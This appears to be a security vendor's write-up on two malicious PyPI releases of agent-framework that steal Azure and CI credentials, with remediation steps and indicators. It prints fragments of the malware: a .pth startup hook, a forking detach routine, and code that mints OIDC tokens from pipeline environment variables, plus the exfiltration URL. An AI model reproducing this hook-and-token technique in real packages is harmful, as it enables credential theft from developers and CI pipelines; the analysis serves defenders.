---
id: collect-261121-veille-ia/microsoft-actu/agent-framework-compromised-python-startup-hooks-steal-azure-and-ci-credentials-endor-labs
title: "agent-framework compromised: Python startup hooks steal Azure and CI credentials | Endor Labs"
domain: microsoft-actu
role: reference
task: article
actors: ["Microsoft"]
dates: []
keywords: ["agent", "framework", "python", "azure", "agent-framework", "package", "meta", "malicious"]
source: https://www.endorlabs.com/learn/agent-framework-compromised-software-supply-chain-attack
source_anchor: ""
source_lines: [1, 199]
section: "Microsoft_Actu"
---
## TL;DR

On November 17, 2026, two malicious releases of `agent-framework`, the meta-package for Microsoft Agent Framework on PyPI, were published within 33 minutes of each other. Agent-framework is a popular package for building production-grade AI agents and multi-agent workflows. The package sees about 190,000 downloads a month.

Endor Labs detected both malicious packages within three minutes of publication. Version `1.26.1` went up at 20:35 UTC. By 21:13 UTC it had been removed from the index, and version `1.26.2` had taken its place as the latest release. Both carry the same credential stealer and send results to the same webhook.site URL. An unpinned `pip install agent-framework` resolves to `1.26.2` as of this writing.

The attack lives entirely in packaging. Neither release changes Agent Framework code, and neither pulls in a malicious dependency. Each wheel adds a `.pth` file to `site-packages`. Python executes import lines in `.pth` files on every interpreter start, so the stealer runs on any Python launch in an affected environment, including pip itself, whether or not anything imports Agent Framework.

Three things specific to this case:

- **The second release is built to evade a diff of the first.** In`1.26.2` the package's own`agent_framework_meta/__init__.py` is byte-identical to the clean`1.26.0` . The payload moved to a new top-level module,`af_runtime_diag.py` , loaded by its own`.pth` file. Detection keyed on changes to the package's module would pass`1.26.2` .
- **It targets the identities that build and run agents.** The collector requests Azure managed identity tokens for 12 resources, an Azure DevOps OIDC token, and (in`1.26.2` ) GitHub Actions OIDC tokens for Azure federated credentials. It also reads Azure DevOps agent`.credentials` files. Developer laptops are in scope, but the payload is written for CI runners and Azure workloads.
- **Only the meta-package was touched.** The 22 sibling`agent-framework-*` packages we checked, including`agent-framework-core` , still have November 12 as their latest release. Both malicious versions pin`agent-framework-core[all]==1.26.0` , so the rest of the framework installs normally and the application keeps working.

## Affected artifacts

Neither malicious version shipped a source distribution. Every `agent-framework` release we examined from `1.21.0` through `1.26.0` shipped both a wheel and an sdist.

## Timeline

All times UTC.

The second upload came 33 minutes after the first. Whoever published `1.26.1` still had publishing access to the project after it went up, and used it to ship a revised payload.

## Technical analysis

### Execution on Python startup

The clean `1.26.0` wheel contains one Python file, `agent_framework_meta/__init__.py`, which reports the package version. `1.26.1` adds two files and changes that one:

```
agent_framework_meta.pth              (new, 28 bytes)
agent_framework_meta/__init__.py      (changed, 853 -> 994 bytes)
agent_framework_meta/_telemetry.py    (new, 6,721 bytes)
```
The `.pth` file contains a single line:

`import agent_framework_meta`
Python's `site` module executes `.pth` lines that begin with `import` during interpreter startup. Importing the package runs the block appended to the end of `__init__.py`:

```
# Lightweight runtime diagnostics hook
try:
    from . import _telemetry as _telemetry
    _telemetry._start()
except Exception:
    pass
```
`_start()` sets an environment variable so child processes skip collection, then detaches. On Linux and macOS it forks and calls `setsid()`, so collection continues after the parent interpreter exits. Where `fork` is unavailable it falls back to a daemon thread:

```
def _start():
    if os.environ.get("_AF_TEL"):
        return
    os.environ["_AF_TEL"] = "1"
    try:
        if hasattr(os, "fork"):
            pid = os.fork()
            if pid == 0:
                try:
                    os.setsid()
                except Exception:
                    pass
                _run()
                os._exit(0)
            return
    except Exception:
        pass
```
The guard lives only in the process environment. Every new top-level Python launch in a fresh shell or CI step collects again. There is no on-disk marker, so the absence of one tells responders nothing.

### What the collector takes

Every collection step is wrapped in its own `try/except`, so a missing file or a blocked endpoint does not stop the rest.

The file globs use `/home/*` and `/root`, so on a host where the process runs with broad read access the collector takes other users' credentials too.

### Cloud and CI identity tokens

The token requests do more than read what is already on disk. They mint fresh tokens from whatever identity the host or pipeline carries. The managed identity step loops over 12 audiences:

The GUID is the Azure DevOps resource ID. The list covers Azure Resource Manager, Microsoft Graph, Key Vault, Storage, Container Registry, and the Azure AI and Machine Learning endpoints that Agent Framework users are most likely to have granted their identities.

In an Azure Pipelines job, the collector uses the job's `System.AccessToken` to request a federated token:

```
at = os.environ.get("SYSTEM_ACCESSTOKEN") or os.environ.get("SYSTEM_ACCESSTOKEN") or ""
oe = os.environ.get("SYSTEM_OIDCREQUESTURI") or ""
if oe and at:
    for suffix, body in [("?api-version=7.1", {"scopes": ["api://AzureADTokenExchange"]}), ("?api-version=7.1", {})]:
```
`1.26.2` adds the same step for GitHub Actions. Any workflow granted `id-token: write` exposes `ACTIONS_ID_TOKEN_REQUEST_URL` and `ACTIONS_ID_TOKEN_REQUEST_TOKEN`, and the collector uses them to request ID tokens it can exchange for Azure access through a federated credential:

```
u = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL") or ""
t = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN") or os.environ.get("ACTIONS_RUNTIME_TOKEN") or ""
if u and t:
    for aud in ("api://AzureADTokenExchange", "https://management.azure.com/"):
```
These tokens are short-lived. They are also usable immediately, and they are issued for whatever the identity can reach. A pipeline identity with subscription-level rights hands the operator that access for the token's lifetime.

### Exfiltration

The destination is stored base64-encoded:

It decodes to `https://webhook.site/d381fd80-ec62-42ad-8f5c-d1b15103c9bb`. The collector serializes its results as JSON, compresses them with zlib at level 9, base64-encodes the result, and POSTs it to that URL with `?t=telemetry` and a 25-second timeout. The User-Agent is `af-runtime-diagnostics/1` in `1.26.1` and `runtime-diagnostics/1` in `1.26.2`. There is no encryption beyond TLS. The response is read and discarded. Neither release fetches or executes remote code.

### What changed in 1.26.2

`1.26.2` is the same collector, moved and extended. The changes are consistent with an operator who expected `1.26.1` to be caught by its diff from `1.26.0`:

The second release added GitHub Actions targeting. Whether that reflects something the operator learned from the first round of exfiltrated data, or a feature that was planned anyway, cannot be determined from the artifacts.

## How the malicious releases differ from legitimate ones

The uploads came from an account or token with publishing rights to `agent-framework`. Nothing in the package metadata separates them from Microsoft's releases: the author, project URLs, description, and classifiers are copied unchanged. The signal is in how the releases were cut.

PyPI shows no provenance attestation for either malicious wheel. That does not set them apart, because `1.26.0` has none either. As a result, PyPI offers consumers no cryptographic way to tell an attacker's upload from Microsoft's for this project. Trusted publishing with attestations would not have stopped a stolen token from uploading, but its absence would have stood out against a history of attested releases.

## Indicators of compromise

### Package and payload hashes (SHA-256)

The `agent_framework_meta/__init__.py` in `1.26.2` hashes to `5f04333fc30dc7a1af5407996249761531ee75df423f3ea58460dc64ae8e49f1`, the same as the clean `1.26.0` file. Do not use it as an indicator.

### Network indicators

webhook.site is a legitimate request-inspection service. Match on the full URL path, not the domain alone.

### Host indicators

## Remediation

### Step 1: Find exposure

Any install of `agent-framework` without an exact pin since 20:35 UTC on November 17 resolved to a malicious version. Search everywhere it could have entered:

```
# Lockfiles and requirement files
grep -rnE 'agent[-_]framework.{0,20}1\.26\.[12]\b' \
  --include='*.txt' --include='*.lock' --include='*.toml' --include='*.cfg' .
# Installed environments: read from disk, do not run the environment's Python
find / -path '*site-packages/agent_framework-1.26.[12].dist-info' -type d 2>/dev/null
find / -path '*site-packages/*' \( -name 'agent_framework_meta.pth' -o -name 'af_runtime_diag.pth' \) -type f 2>/dev/null
# Confirm by hash
find / -path '*site-packages/*' \( -name '_telemetry.py' -o -name 'af_runtime_diag.py' \) -type f \
  -exec sha256sum {} + 2>/dev/null | grep -E '39fa329f2a93f734|54d885b7d7161c9e'
```
Check CI build logs and dependency caches from November 17 onward, including any job that installed `agent-framework` without a version pin. Check container images built after 20:35 UTC that install Python dependencies at build time.

### Step 2: Contain affected hosts

- Do not run `python` or`pip` in an affected environment as a first step. Every interpreter start runs the collector again, and that includes`pip uninstall` .
- Isolate the host or container from the network before investigating where you can, and preserve process listings and egress logs.
- Remove the payload with tools that do not start the affected interpreter. Delete `agent_framework_meta.pth` ,`af_runtime_diag.pth` ,`af_runtime_diag.py` ,`agent_framework_meta/_telemetry.py` , their`__pycache__` entries, and the malicious`dist-info` directory from`site-packages` .
- Prefer rebuilding from a clean base image or a fresh virtual environment over cleaning in place.

### Step 3: Rotate credentials

If Python ran in an affected environment after installation, treat every credential the process could read or request as exposed. Rotate from a clean machine:

- Azure managed identities and service principals reachable from affected hosts. Issued access tokens generally cannot be revoked before they expire, so review Entra ID sign-in logs for managed identity and service principal sign-ins from unexpected IP addresses, and consider removing role assignments temporarily while you investigate.
- Azure DevOps: re-register self-hosted agents whose `.credentials` files were readable, rotate PATs and service connection secrets, and review federated service connections used by affected pipelines.
- GitHub Actions workflows with `id-token: write` that installed a malicious version: review use of the federated credentials those workflows can assume.
- Azure CLI token caches under `~/.azure` , plus npm, PyPI index, Docker registry, git, and Hugging Face credentials.
- Azure OpenAI, Foundry, and other model provider keys, and every secret present in the process environment or in `.env` files under`/app` or`/workspace` .

Review cloud, identity provider, repository, and registry audit logs for use of these credentials after the install time.

### Step 4: Hunt in network logs

- POST requests to `webhook.site/d381fd80-ec62-42ad-8f5c-d1b15103c9bb` .
- Requests with User-Agent `af-runtime-diagnostics/1` or`runtime-diagnostics/1` .
- A burst of IMDS token requests for many different resources from a single Python process.

If egress from your CI runners or Azure workloads to `webhook.site` is not something you expect, blocking the domain is low-risk and closes this channel for any variant that reuses it.

### Step 5: Pin and restore

```
# requirements.txt, generated with hashes for the full dependency set
# (pip-compile --generate-hashes or uv pip compile --generate-hashes)
agent-framework==1.26.0 \
    --hash=sha256:14267ec8e6929c139015f8ec918adc638a71c7656901413426bb30ab199b6d71
pip install --require-hashes -r requirements.txt</code></pre>
```
`--require-hashes` needs a hash for every package, so generate the file rather than writing it by hand. Block `agent-framework==1.26.1` and `agent-framework==1.26.2` in your package proxy or allowlist. As of 21:16 UTC, `1.26.2` is still the latest version on PyPI, so any unpinned install continues to receive the payload until it is removed.

### Longer term

- **Alert on startup hooks in dependencies.** A new`.pth` file with an import line in a third-party wheel is rare and high-signal. LiteLLM 1.107.0 used the same technique last month.
- **Treat a missing sdist as a signal.** A project that has always shipped a wheel and an sdist and suddenly ships a wheel alone deserves a second look before it reaches a build.
- **Delay new releases.** A minimum release age in your package proxy, even 24 hours, would have kept both versions out of every build that respected it.
- **Scope CI identities tightly.** Grant`id-token: write` only to jobs that need it, and restrict federated credential subject claims to specific repositories, branches, and environments. A job that installs dependencies should not also hold a token that can mint subscription-wide Azure access.
- **Publish with attestations.** For maintainers: trusted publishing with attestations does not stop every compromise, but a consistent history of attested releases makes an unattested upload stand out to anyone checking.

### What's next?

When you're ready to take the next step in securing your software supply chain, here are 3 ways Endor Labs can help:
